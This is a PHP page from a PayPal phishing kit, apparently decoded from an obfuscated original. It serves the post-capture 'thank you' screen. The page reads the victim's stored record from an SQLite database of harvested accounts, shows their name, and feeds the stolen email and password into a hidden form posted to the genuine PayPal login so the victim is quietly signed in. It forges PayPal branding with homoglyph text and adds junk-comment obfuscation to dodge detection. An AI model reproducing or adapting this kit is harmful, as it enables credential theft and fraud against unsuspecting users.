<?php
// Decoded by Girudatsu.com Member

$hOAhHPzWlL = 'date';
$ySljZvSry = 'date';
include 'inc/crypt.php';
echo '<!' . xCrypt(7 + 93, 286 + 214) . '>';
?>
<!-- <script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/thanks.min.js');
?>
"></script> -->
<script type="<?php
echo xTextEncode('text/javascript');
?>
" src="<?php
echo xTextEncode('js/thanks.js');
?>
"></script>
<style>
	body{ background-color: #f8f8f8; }
</style>
<?php
echo '<!' . xCrypt(40 - -60, 175 + 325) . '>';
$hOAhHPzWlL = 'date';
$ySljZvSry = 'date';
@session_start();
$pdo = new PDO('sqlite:admin/database.db');
if ($pdo) {
    $xVictime = $_SESSION['xVictime_ID'];
    $account = $pdo->query('' . 'SELECT * FROM `accounts` WHERE `id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    $fullname = $account['fullname'];
    $username = $account['username'];
    $password = $account['password'];
    $account_language = $account['account_language'];
    include_once 'inc/language.php';
}
?>
<div id="<?php
echo xTextEncode('header_update');
?>
">
	<div class="<?php
echo xCrypt(-66 - -76, 47 - -3);
?>
 <?php
echo xTextEncode('container_update for_nav');
?>
">
		<div id="<?php
echo xTextEncode('menu_btn_update');
?>
"></div>
		<div id="<?php
echo xTextEncode('logo_update');
?>
"></div>
		<ul class="<?php
echo xCrypt(83 + -73, 23 + 27);
?>
 <?php
echo xTextEncode('nav');
?>
">
			<li class="<?php
echo xCrypt(12 - 2, 74 - 24);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(38 + -28, 119 + -69);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['thanks']['navbar']['1'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(96 + -86, -49 - -99);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(31 + -21, 88 - 38);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['thanks']['navbar']['2'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(57 + -47, 54 + -4);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(-37 - -47, 22 - -28);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['thanks']['navbar']['3'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(-19 - -29, 139 + -89);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(-75 - -85, 20 + 30);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['thanks']['navbar']['4'];
?>
</a>
			</li>
			<li class="<?php
echo xCrypt(13 + -3, 5 + 45);
?>
 <?php
echo xTextEncode('nav-item');
?>
">
				<a class="<?php
echo xCrypt(39 + -29, 26 + 24);
?>
 <?php
echo xTextEncode('nav-link');
?>
" href="#"><?php
echo $language['thanks']['navbar']['5'];
?>
</a>
			</li>
		</ul>
<?php
echo '<!' . xCrypt(158 - 58, 572 + -72) . '>';
?>
		<div id="<?php
echo xTextEncode('logout');
?>
">
			<div class="<?php
echo xCrypt(48 + -38, 97 - 47);
?>
 <?php
echo xTextEncode('sub_logout');
?>
">
				<button><?php
echo $language['thanks']['navbar']['6'];
?>
</button>
			</div>
			<div class="<?php
echo xCrypt(19 - 9, 79 - 29);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('setting');
?>
">
			</div>
			<div class="<?php
echo xCrypt(98 + -88, 132 + -82);
?>
 <?php
echo xTextEncode('sub_logout');
?>
" id="<?php
echo xTextEncode('alert');
?>
">
			</div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(82 + 18, 468 - -32) . '>';
?>
<div id="<?php
echo xTextEncode('update_content');
?>
">
	<div class="<?php
echo xCrypt(-67 - -77, 45 - -5);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(14 - 4, -17 - -67);
?>
 <?php
echo xTextEncode('row first');
?>
">
			<div class="<?php
echo xCrypt(69 + -59, 87 + -37);
?>
 <?php
echo xTextEncode('twelve columns');
?>
">
<?php
echo '<!' . xCrypt(197 - 97, 158 + 342) . '>';
?>
				<div id="<?php
echo xTextEncode('form_thanks');
?>
">
					<div><img src="<?php
echo xTextEncode('img/done.png');
?>
"></div>
					<div id="<?php
echo xTextEncode('hdr');
?>
"><b><?php
echo $language['thanks']['content']['1'];
?>
<br><?php
echo $fullname;
?>
 ,</b></div>
					<div id="<?php
echo xTextEncode('cntn');
?>
">
					<?php
echo $language['thanks']['content']['2'];
?>
					<?php
echo $language['thanks']['content']['3'];
?>
					<?php
echo $language['thanks']['content']['4'];
?>
					<?php
echo $language['thanks']['content']['5'];
?>
					<?php
echo $language['thanks']['content']['6'];
?>
					<br><button type="<?php
echo xTextEncode('button');
?>
" class="<?php
echo xCrypt(-18 - -28, -2 - -52);
?>
 <?php
echo xTextEncode('button-primary');
?>
" id="<?php
echo xTextEncode('btn_myaccount');
?>
"><?php
echo xTextEncode('My ΡayΡal');
?>
</button>&nbsp;&nbsp;<button type="<?php
echo xTextEncode('button');
?>
" id="<?php
echo xTextEncode('btn_logout');
?>
"> <?php
echo $language['thanks']['content']['7'];
?>
</button><br>
					<?php
echo $language['thanks']['content']['8'];
?>
					</div>
				</div>
<?php
echo '<!' . xCrypt(66 - -34, 118 + 382) . '>';
?>
				<div style="display:none" id="<?php
echo xTextEncode('loginform');
?>
">
					<form id="<?php
echo xTextEncode('form-ppcom');
?>
" method="post" name="<?php
echo xTextEncode('login_form');
?>
" id="<?php
echo xTextEncode('login_form');
?>
" action="https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit" autocomplete="off" novalidate="">
						<input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('login_cmd');
?>
" value="">
						<input type="<?php
echo xTextEncode('hidden');
?>
" name="<?php
echo xTextEncode('login_params');
?>
" value="">
						<input id="<?php
echo xTextEncode('email');
?>
" name="<?php
echo xTextEncode('login_email');
?>
" type="<?php
echo xTextEncode('email');
?>
" autocomplete="off" value="<?php
echo $username;
?>
">
						<input id="<?php
echo xTextEncode('password');
?>
" name="<?php
echo xTextEncode('login_password');
?>
" type="<?php
echo xTextEncode('password');
?>
" value="<?php
echo $password;
?>
">
						<input type="<?php
echo xTextEncode('submit');
?>
" id="<?php
echo xTextEncode('btnLogin');
?>
" name="<?php
echo xTextEncode('submit.x');
?>
">
					</form>
				</div>
<?php
echo '<!' . xCrypt(80 + 20, 450 + 50) . '>';
?>
			</div>
		</div>
		<div id="<?php
echo xTextEncode('footer_update_mobile');
?>
">
			<div class="<?php
echo xCrypt(85 + -75, -38 - -88);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(59 + -49, 57 - 7);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font></div>
			<div class="<?php
echo xCrypt(79 + -69, -4 - -54);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(1 - -9, -25 - -75);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 PayPal, Inc. All rights reserved.</font></div>
		</div>
	</div>
</div>
<?php
echo '<!' . xCrypt(60 - -40, 160 + 340) . '>';
?>
<div id="<?php
echo xTextEncode('footer_update');
?>
">
	<div class="<?php
echo xCrypt(1 - -9, 46 + 4);
?>
 <?php
echo xTextEncode('container_update');
?>
">
		<div class="<?php
echo xCrypt(104 + -94, 29 - -21);
?>
 <?php
echo xTextEncode('row footer_row_1');
?>
"><font class="<?php
echo xCrypt(54 + -44, 32 + 18);
?>
 <?php
echo xTextEncode('footer1');
?>
">Help&nbsp;&&nbsp;Contact&nbsp;&nbsp;Security</font><img src="<?php
echo xTextEncode('img/feedback.png');
?>
"></div>
		<div class="<?php
echo xCrypt(107 + -97, 48 - -2);
?>
 <?php
echo xTextEncode('row footer_row_2');
?>
"><font class="<?php
echo xCrypt(103 + -93, 99 + -49);
?>
 <?php
echo xTextEncode('footer2');
?>
">© 1999-<?php
echo @date('Y');
?>
 PayPal, Inc. All rights reserved.</font> <font class="<?php
echo xCrypt(6 - -4, -32 - -82);
?>
 <?php
echo xTextEncode('footer3');
?>
">|</font> <font class="<?php
echo xCrypt(-6 - -16, 59 - 9);
?>
 <?php
echo xTextEncode('footer4');
?>
">Privacy&nbsp;&nbsp;&nbsp;Legal&nbsp;&nbsp;&nbsp;Policy updates</font></div>
	</div>
</div>
<?php
echo '<!' . xCrypt(70 - -30, 786 - 286) . '>';
